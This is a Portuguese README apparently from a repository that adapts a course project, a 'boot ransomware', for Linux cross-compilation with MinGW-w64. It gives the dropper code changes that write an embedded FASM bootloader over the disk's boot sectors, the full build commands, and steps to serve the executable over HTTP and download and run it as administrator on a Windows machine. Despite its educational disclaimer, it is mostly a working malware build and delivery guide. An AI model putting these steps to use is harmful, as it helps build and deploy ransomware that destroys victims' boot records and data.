
# Adaptação para Linux do módulo "Criando um Ransomware de Boot" da Universidade Hacker.

Este repositório documenta a adaptação de um projeto educacional de ransomware de boot, originalmente desenvolvido para Windows (Visual Studio), para ser compilado no Linux utilizando Mingw-w64 e recursos embutidos (dropper technique).

## 🛠️ Adaptação para Linux

O código original foi modificado para ser compilado no Linux utilizando a toolchain **MinGW-w64**, eliminando a dependência do Visual Studio.

### 📝 Modificações no Código

#### 1. Correção do include (case-sensitive)
```c\
// Antes (Windows)
#include <Windows.h>

// Depois (Linux/MinGW)
#include <windows.h>
```

#### 2. Remoção do bootloader hardcoded
A variável `unsigned char bootloader[]` com o código em hexadecimal foi removida.

#### 3. Declaração dos símbolos do recurso
```c\
extern char binary_ransom_bin_start[] __asm__("_binary_ransom_bin_start");
extern char binary_ransom_bin_size[] __asm__("_binary_ransom_bin_size");
```

#### 4. Acesso ao recurso na main
```c\
unsigned char* bootloader = (unsigned char*)binary_ransom_bin_start;\
unsigned int bootloaderSize = (unsigned int)binary_ransom_bin_size;\
```

#### 5. Substituição do tamanho fixo (opcional)
```c\
// Antes
memcpy(cInfected, bootloader, SECTOR_SIZE*2);
WriteFile(hDisk, cInfected, SECTOR_SIZE*2, ...);

// Depois
memcpy(cInfected, bootloader, bootloaderSize);
WriteFile(hDisk, cInfected, bootloaderSize, ...);
```

## 📦 Pré-requisitos (Linux)

```bash\
# Instalar o FASM (assembler)
# Download manual em: https://flatassembler.net/
# Ou usar o pacote da distribuição

# Instalar o MinGW-w64 completo
sudo apt-get install gcc-mingw-w64-i686 mingw-w64-i686-dev
```

## 🔨 Processo de Build

### Passo 1: Montar o bootloader
```bash\
# Gerar o binário do ransomware (bootloader)
fasm ransom.asm ransom.bin
```

### Passo 2: Criar o recurso objeto
```bash\
# Converter o binário para objeto COFF (recurso embutido)
objcopy -I binary -O pe-i386 -B i386 ransom.bin ransom.o
```

### Passo 3: Compilar o dropper
```bash\
# Compilar o programa C linkando com o recurso
i686-w64-mingw32-gcc -o ransomware.exe main1.c ransom.o -I/usr/i686-w64-mingw32/include -lntdll -static
```

## 🚀 Entrega e Execução

### Servindo o executável (Linux)
```bash\
# Criar um servidor HTTP simples com Python
python3 -m http.server 8000
```

### Download na VM Windows (PowerShell como Admin)
```powershell\
# Baixar o executável
Invoke-WebRequest -Uri "http://<IP_DO_LINUX>:8000/ransomware.exe" -OutFile "ransomware.exe"

# Executar (necessário privilégios de administrador)
.\ransomware.exe
```

## ⚠️ Aviso Legal

Este projeto é **estritamente educacional**. O código deve ser utilizado apenas em ambientes controlados (VMs) para fins de aprendizado.

O autor não se responsabiliza pelo uso indevido deste código.

**Nota**: Sempre teste em máquinas virtuais isoladas. Este código pode danificar sistemas reais!
